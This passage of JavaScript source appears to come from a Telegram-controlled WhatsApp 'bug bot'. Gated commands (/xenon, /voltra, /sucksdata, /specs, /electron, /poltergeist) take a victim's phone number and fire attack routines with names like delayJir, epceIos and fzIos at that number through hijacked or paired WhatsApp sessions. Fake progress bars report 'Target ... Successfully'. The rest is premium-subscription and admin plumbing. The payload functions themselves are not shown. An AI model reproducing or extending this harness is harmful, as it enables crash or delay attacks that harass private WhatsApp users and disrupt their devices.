        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.invis, {
      caption: "Example: /xenon 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.invis, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.invis,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await delayJir(sock, jid);
   }
});

// ========== COMMAND VOLTRA ==========
bot.onText(/^\/voltra (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.invis, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.invis, {
      caption: "Example: /voltra 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.invis, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.invis,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await xCursedDelayOneHit(sock, jid);
     await new Promise((r) => setTimeout(r, 100));
   }
});

// ========== COMMAND SUCKSDATA ==========
bot.onText(/^\/sucksdata (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.invis, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.invis, {
      caption: "Example: /sucksdata 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.invis, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.invis,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await delayJir(sock, jid);
   }
});

// ========== COMMAND METAMEFIFIN ==========
bot.onText(/^\/metamefifin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.invis, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.invis, {
      caption: "Example: /metamefifin 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.invis, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.invis,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await delayJir(sock, jid);
   }
});

// ========== COMMAND SPECS ==========
bot.onText(/^\/specs (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.ios, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.ios, {
      caption: "Example: /specs 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.ios, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.ios,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await epceIos(sock, jid);
   }
});

// ========== COMMAND ELECTRON ==========
bot.onText(/^\/electron (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.ios, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.ios, {
      caption: "Example: /electron 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.ios, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.ios,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await epceIos(sock, jid);
   }
});

// ========== COMMAND POLTERGEIST ==========
bot.onText(/^\/poltergeist (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.ios, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.ios, {
      caption: "Example: /poltergeist 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.ios, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.ios,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await fzIos(sock, jid);
   }
});

// ========== COMMAND ADMIN ==========
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.",
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "⚠ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        parse_mode: "Markdown"
      }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: `╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
      parse_mode: "Markdown"
    }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageMedia(
        {
          type: "photo",
          media: menuImages.owner,
          caption: `╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`
        },
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageMedia(
          {
            type: "photo",
            media: menuImages.owner,
            caption: `╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`
          },
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageMedia(
          {
            type: "photo",
            media: menuImages.owner,
            caption: `╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`
          },
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageMedia(
      {
        type: "photo",
        media: menuImages.owner,
        caption: `╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`
      },
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ You are not authorized to add premium users.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.",
        parse_mode: "Markdown"
      }
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
          "YYYY-MM-DD HH:mm:ss"
        )}.`,
        parse_mode: "Markdown"
      }
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
          "YYYY-MM-DD HH:mm:ss"
        )}.`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ You are not authorized to view the premium list.",
        parse_mode: "Markdown"
      }
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "📌 No premium users found.",
        parse_mode: "Markdown"
      }
    );
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendPhoto(
    chatId,
    menuImages.owner,
    {
      caption: message,
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match || !match[1]) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.",
        parse_mode: "Markdown"
      }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendPhoto(
      chatId,
      menuImages.owner,
      {
        caption: "❌ Invalid input. Example: /addadmin 6843967527.",
